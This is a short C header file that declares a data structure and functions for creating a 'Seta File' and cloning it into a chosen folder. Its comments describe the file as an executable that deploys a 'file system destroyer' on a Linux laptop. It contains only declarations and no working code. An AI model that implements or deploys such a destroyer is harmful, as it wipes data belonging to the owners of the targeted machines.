#ifndef SETA_FILESYS_H
#define SETA_FILESYS_H

#include <stdio.h>
#include <stdlib.h>

// TODO's
// TODO: create a list of known folders in this operating system to compare
// against the given deploy_folder

// A "Seta File" is a .exe responsible for deploying the file system
// destroyer on a given laptop that holds a linux operating system.
// It holds a special set of instructions that are seperate from
// the VM's files. See vm.h for more info on a .seta file.
struct SetaFile {
    const char *name;
    const char *deploy_folder;
    // VM *vm;
};

typedef struct SetaFile seta_file_t;

// Create a seta file
seta_file_t *seta_file_new(const char *name, const char *deploy_folder);

// Put it in the given directory
int seta_file_clone(seta_file_t *sf);

// Free SetaFile in memory
void seta_file_done(seta_file_t *sf);

// Run the VM's instructions/code
// int start_vm();

#endif // SETA_FILESYS_H
